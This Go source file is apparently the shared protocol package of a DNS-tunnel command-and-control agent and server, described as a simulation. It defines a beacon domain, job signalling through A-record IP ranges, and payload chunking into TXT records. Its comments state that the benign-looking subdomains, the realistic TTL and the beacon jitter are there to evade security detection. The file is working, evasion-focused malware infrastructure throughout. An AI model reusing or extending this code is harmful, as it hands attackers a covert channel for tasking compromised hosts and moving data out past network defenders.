// Package protocol defines shared constants and utilities for the DNS tunnel.
//
// DESIGN NOTES:
// Both agent and server import this package to ensure consistency.
// Any changes to the protocol (IP ranges, encoding, etc.) happen here once.
package protocol

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"time"
)

// Domain is the base domain used for DNS tunneling.
// In production, you'd make this configurable, but for this simulation
// we'll override it in main.go files where needed.
const Domain = "timeserversync.com"

// DNS TTL for all responses. 300 seconds = 5 minutes.
// This is realistic for a legitimate service and helps avoid suspicion.
// Lower TTLs might trigger security alerts in some environments.
const TTL = 300

// SequenceNumberLength defines how many bytes at the start of each TXT
// record are reserved for the chunk sequence number.
// Example: "00000042" followed by base64 payload data.
// 8 digits supports up to 99,999,999 chunks (way more than we need).
const SequenceNumberLength = 8

// Job status IP ranges (RFC 5737 documentation ranges - safe to use)
// These are never routed on the real internet, so they're perfect for signaling.
var (
	// NoJobRange: 198.51.100.0/24 - Returned when no job is pending
	NoJobRange = net.IPNet{
		IP:   net.ParseIP("198.51.100.0"),
		Mask: net.CIDRMask(24, 32),
	}

	// JobRange: 203.0.113.0/24 - Returned when a job is ready
	JobRange = net.IPNet{
		IP:   net.ParseIP("203.0.113.0"),
		Mask: net.CIDRMask(24, 32),
	}
)

// Subdomains is the rotation list for DNS queries.
// Using legitimate-looking subdomains avoids high-entropy detection.
// High-entropy subdomains (like "x7k2m9p4q1") are a red flag for DNS tunneling.
var Subdomains = []string{
	"www", "mail", "app", "docs", "api",
	"cdn", "assets", "static", "portal", "login",
	"auth", "secure", "support", "help", "status",
	"update", "sync", "time", "ntp", "services",
}

// RandomSubdomain returns a random subdomain from the rotation list.
// Called by the agent before each DNS query.
func RandomSubdomain() string {
	return Subdomains[rand.Intn(len(Subdomains))]
}

// GenerateNoJobIP returns a random IP from the NO JOB range.
// The last octet is randomized to add variety to responses.
func GenerateNoJobIP() net.IP {
	return net.IPv4(198, 51, 100, byte(rand.Intn(256)))
}

// GenerateJobIP returns a random IP from the JOB range.
func GenerateJobIP() net.IP {
	return net.IPv4(203, 0, 113, byte(rand.Intn(256)))
}

// IsJobIP checks if an IP indicates a pending job.
// Used by the agent to interpret A record responses.
func IsJobIP(ip net.IP) bool {
	return JobRange.Contains(ip)
}

// IsNoJobIP checks if an IP indicates no pending job.
func IsNoJobIP(ip net.IP) bool {
	return NoJobRange.Contains(ip)
}

// CalculateJitter returns a random duration within ±jitter of base.
// Example: base=300s, jitter=60s -> returns 240s to 360s randomly.
//
// Jitter is critical for evading detection. Regular, predictable beacons
// (exactly every 5 minutes) are easily detected by security tools.
// Adding randomness makes the traffic look more like legitimate polling.
func CalculateJitter(base time.Duration, jitter time.Duration) time.Duration {
	jitterRange := int64(jitter * 2)
	offset := rand.Int63n(jitterRange) - int64(jitter)
	return base + time.Duration(offset)
}

// ChunkData splits data into chunks suitable for TXT records.
// Each chunk is base64 encoded with an 8-byte sequence prefix.
//
// TXT records can hold up to 255 bytes, but we use ~200 bytes of payload
// per chunk to leave room for the sequence number and some safety margin.
//
// Returns a slice of strings ready to be placed in TXT record responses.
func ChunkData(data []byte, chunkSize int) []string {
	// We need to account for base64 expansion (4 bytes output per 3 bytes input)
	// and the sequence number prefix.
	// If chunkSize is 200, we can fit about 150 bytes of raw data per chunk.
	rawChunkSize := (chunkSize - SequenceNumberLength) * 3 / 4

	var chunks []string
	for i := 0; i < len(data); i += rawChunkSize {
		end := i + rawChunkSize
		if end > len(data) {
			end = len(data)
		}

		chunk := data[i:end]
		encoded := base64.StdEncoding.EncodeToString(chunk)

		// Sequence number is chunk index (i / rawChunkSize)
		seqNum := i / rawChunkSize
		prefixed := fmt.Sprintf("%08d%s", seqNum, encoded)

		chunks = append(chunks, prefixed)
	}

	return chunks
}

// ParseChunk extracts sequence number and payload from a TXT record value.
// Returns sequence number, decoded payload bytes, and any error.
func ParseChunk(txtValue string) (int, []byte, error) {
	if len(txtValue) < SequenceNumberLength {
		return 0, nil, fmt.Errorf("TXT value too short: %d bytes", len(txtValue))
	}

	var seqNum int
	_, err := fmt.Sscanf(txtValue[:SequenceNumberLength], "%08d", &seqNum)
	if err != nil {
		return 0, nil, fmt.Errorf("failed to parse sequence number: %w", err)
	}

	payload, err := base64.StdEncoding.DecodeString(txtValue[SequenceNumberLength:])
	if err != nil {
		return 0, nil, fmt.Errorf("failed to decode base64 payload: %w", err)
	}

	return seqNum, payload, nil
}

// init seeds the random number generator.
// In Go 1.20+, this isn't strictly necessary as math/rand is auto-seeded,
// but it's good practice for reproducibility in testing.
func init() {
	rand.Seed(time.Now().UnixNano())
}
